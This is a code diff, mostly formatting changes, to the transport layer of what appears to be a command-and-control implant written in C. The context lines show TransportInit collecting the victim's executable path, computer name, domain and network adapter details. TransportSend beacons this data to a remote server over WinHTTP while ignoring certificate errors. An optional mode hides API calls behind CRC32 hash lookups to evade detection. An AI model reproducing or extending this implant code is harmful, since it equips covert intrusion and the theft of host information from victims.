@@ -161,8 +161,7 @@ BOOL TransportInit( ) {
                                                                                             GetModuleFileNameA_CRC32B);
 
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-    {
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
         Length = p_GetModuleFileNameA( NULL, Data, Length );
         PackageAddBytes( Package, Data, Length );
     } else {
@@ -180,9 +179,10 @@ BOOL TransportInit( ) {
 
     // Get Computer name
     if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
             check_debug(GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0,
-                        "GetComputerNameExA") ;
+                        "GetComputerNameExA");
+        }
     }
 
     PackageAddBytes( Package, Data, Length );
@@ -199,9 +199,10 @@ BOOL TransportInit( ) {
 
     // Get Domain
     if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
             check_debug(GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0,
                         "GetComputerNameExA Failed!");
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -214,16 +215,14 @@ BOOL TransportInit( ) {
             mem_set( Adapter, 0, Length );
             LocalFree( Adapter );
             Adapter = NULL;
+        } else {
+            PackageAddInt32(Package, 0);
         }
-        else
-            PackageAddInt32( Package, 0 );
-    }
-    else {
+    } else {
         PackageAddInt32(Package, 0);
     }
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-    {
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) ){
         Length = GetModuleFileNameA( NULL, Data, Length );
         PackageAddBytes( Package, Data, Length );
     } else {
@@ -264,8 +263,7 @@ BOOL TransportInit( ) {
                 Instance.Session.Connected = TRUE;
                 Success = TRUE;
             }
-        }
-        else {
+        } else {
             Success = FALSE;
         }
     }
@@ -358,8 +356,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     check_debug(hRequest != NULL, "WinHttpOpenRequest Failed!");
 
-    if ( Instance.Config.Transport.Secure )
-    {
+    if ( Instance.Config.Transport.Secure )    {
         HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
@@ -379,8 +376,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( pWinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) ){
 #else
     // Send our data
-    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
-    {
+    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) ){
 #endif
 
 #if CONFIG_OBFUSCATION == TRUE
@@ -392,8 +388,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         {
 #endif
             RespBuffer = NULL;
-            do
-            {
+            do {
 #if CONFIG_OBFUSCATION == TRUE
                 WinHttpReadData_t p_WinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                                WinHttpReadData_CRC32B);
@@ -429,13 +424,10 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
             }
             Successful = TRUE;
         }
-    }
-    else
-    {
+    }else{
         if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
             Instance.Session.Connected = FALSE;
-        }
-        else {
+        } else {
             // _tprintf( "WinHttpSendRequest: Failed => %d\n", GetLastError() );
         }
         Successful = FALSE;
